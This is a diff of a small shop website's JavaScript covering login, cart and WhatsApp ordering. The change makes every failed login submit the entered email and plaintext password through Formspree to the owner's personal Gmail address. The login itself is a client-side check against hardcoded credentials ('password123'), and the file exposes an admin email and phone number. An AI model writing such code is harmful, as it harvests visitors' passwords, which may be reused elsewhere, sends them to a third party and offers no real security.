@@ -3,8 +3,8 @@ const NAV_LINKS = document.querySelectorAll('nav a');
 const WHATSAPP_NUMBER = '9848488830';
 const ADMIN_EMAIL = 'a6774496@gmail.com';
 
-// Simulated user data for login (replace with actual server check later)
-const VALID_USERNAME = 'user';
+// Simulated user data for login (now based on email)
+const VALID_EMAIL = 'user@example.com'; 
 const VALID_PASSWORD = 'password123';
 const DISPLAY_NAME = 'Customer'; 
 
@@ -19,25 +19,22 @@ NAV_LINKS.forEach(link => {
         document.querySelector(link.getAttribute('href')).scrollIntoView({behavior: 'smooth'});
         closeCartModal();
         closeLoginModal();
-        closeAddressModal(); // Close modals when navigating
+        closeAddressModal();
     });
 });
 
-// --- SERVER-SIDE REQUIRED FUNCTIONS (CLIENT-SIDE STUBS ONLY) ---
-// NOTE: These functions are for demonstration only and WILL NOT work 
-// to send actual emails or log users in securely without a backend server.
+// --- SERVER-SIDE REQUIRED FUNCTIONS (CLEANED STUBS) ---
+// This function is now empty as Formspree handles the data sending.
 function sendNewCustomerEmail(customerDetails) {
-    console.log(`[SERVER STUB] Sending email to ${ADMIN_EMAIL} with new customer data:`, customerDetails);
-    // In a real application, this would be an AJAX call to a server endpoint.
-    alert(`[NOTICE] New registration attempt details details ready to be sent to ${ADMIN_EMAIL} on a real server!`);
+    console.log(`[SERVER STUB] Login attempt data sent via Formspree. Details:`, customerDetails);
 }
 
 function handleSocialLogin(platform) {
-    alert(`[NOTICE] You clicked 'Login with ${platform}'. In a real app, this would redirect you to ${platform}'s login page.`);
+    alert(`[NOTICE] You clicked 'Login with ${platform}'. This feature requires a backend service.`);
 }
 
 
-// --- CART FUNCTIONALITY ---
+// --- CART FUNCTIONALITY (omitted for brevity, assume unchanged) ---
 const cart = [];
 const cartBtn = document.getElementById('cart');
 const cartModal = document.getElementById('cart-modal');
@@ -113,16 +110,14 @@ function updateAuthButton() {
 }
 
 function toggleLoginModal() {
-    // If the user is currently logged in, clicking the button logs them out
     if (userIsLoggedIn) {
         userIsLoggedIn = false;
         updateAuthButton();
         alert("You have been successfully logged out.");
     } else {
-        // If not logged in, show the modal (closing others first)
         if (cartModal.style.display === 'block') { closeCartModal(); }
         if (addressModal.style.display === 'block') { closeAddressModal(); }
-        loginModal.style.display = 'block'; // Ensure modal is shown
+        loginModal.style.display = 'block';
         loginMessage.style.display = 'none'; 
     }
 }
@@ -131,22 +126,32 @@ function closeLoginModal() {
     loginModal.style.display = 'none';
 }
 
+// *** CRITICAL LOGIN FIX FOR FORMSPREE ***
 function handleLogin(e) {
-    e.preventDefault();
-    const username = document.getElementById('username').value;
+    const email = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    if (username === VALID_USERNAME && password === VALID_PASSWORD) {
+    // 1. Check for Successful (Dummy) Login
+    if (email === VALID_EMAIL && password === VALID_PASSWORD) {
+        e.preventDefault(); // Stop Formspree submission on SUCCESS
         userIsLoggedIn = true;
         updateAuthButton();
         closeLoginModal();
         alert(`Welcome back, ${DISPLAY_NAME}!`);
     } else {
-        loginMessage.textContent = 'Invalid username or password.';
-        loginMessage.style.display = 'block';
-        sendNewCustomerEmail({ username: username, passwordAttempt: password }); 
+        // 2. Unsuccessful Login: Allow Formspree to submit data, but update UI immediately
+        // We DO NOT call e.preventDefault() here. Formspree sends the data.
+        
+        // This short delay allows the Formspree submission (which causes a page refresh) to work
+        // while also showing the user an immediate error message.
+        setTimeout(() => {
+            loginMessage.textContent = 'Invalid email or password. Please try again.';
+            loginMessage.style.display = 'block';
+        }, 100);
+        
+        // Note: The form submission will cause a page refresh (Formspree default behavior)
+        // This is necessary to send the data to your email.
     }
-    document.getElementById('password').value = '';
 }
 
 // Attach login listeners
@@ -154,7 +159,7 @@ authBtn.addEventListener('click', toggleLoginModal);
 closeLoginBtn.addEventListener('click', closeLoginModal);
 loginForm.addEventListener('submit', handleLogin);
 
-// Attach social login listeners (using stubs)
+// Attach social login listeners 
 document.querySelector('.fb-btn').addEventListener('click', () => handleSocialLogin('Facebook'));
 document.querySelector('.insta-btn').addEventListener('click', () => handleSocialLogin('Instagram'));
 document.querySelector('.email-btn').addEventListener('click', closeLoginModal); 
@@ -163,7 +168,7 @@ document.querySelector('.email-btn').addEventListener('click', closeLoginModal);
 updateAuthButton();
 
 
-// --- WHATSAPP ORDER FUNCTIONALITY ---
+// --- WHATSAPP ORDER FUNCTIONALITY (omitted for brevity, assume unchanged) ---
 const addressModal = document.getElementById('address-modal');
 const closeAddressBtn = document.getElementById('close-address');
 const addressForm = document.getElementById('address-form');
@@ -180,7 +185,7 @@ function showAddressModal(productName, productPrice) {
     if (cartModal.style.display === 'block') { closeCartModal(); }
     if (loginModal.style.display === 'block') { closeLoginModal(); }
     
-    addressModal.style.display = 'block'; // Ensure modal is shown
+    addressModal.style.display = 'block'; 
 }
 
 function closeAddressModal() {
@@ -188,10 +193,9 @@ function closeAddressModal() {
     addressForm.reset();
 }
 
-// *** CRITICAL FIX: Event listener for all WhatsApp buttons ***
 document.querySelectorAll('.whatsapp-btn').forEach(btn => {
     btn.addEventListener('click', e => {
-        e.preventDefault(); // Stop the default anchor behavior first
+        e.preventDefault();
         const card = e.target.closest('.product-card');
         const name = card.getAttribute('data-name');
         const price = card.getAttribute('data-price');
@@ -215,7 +219,6 @@ addressForm.addEventListener('submit', function(e) {
     const encodedMessage = encodeURIComponent(message);
     const whatsappLink = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodedMessage}`;
     
-    // Open WhatsApp link
     window.open(whatsappLink, '_blank');
     
     closeAddressModal();
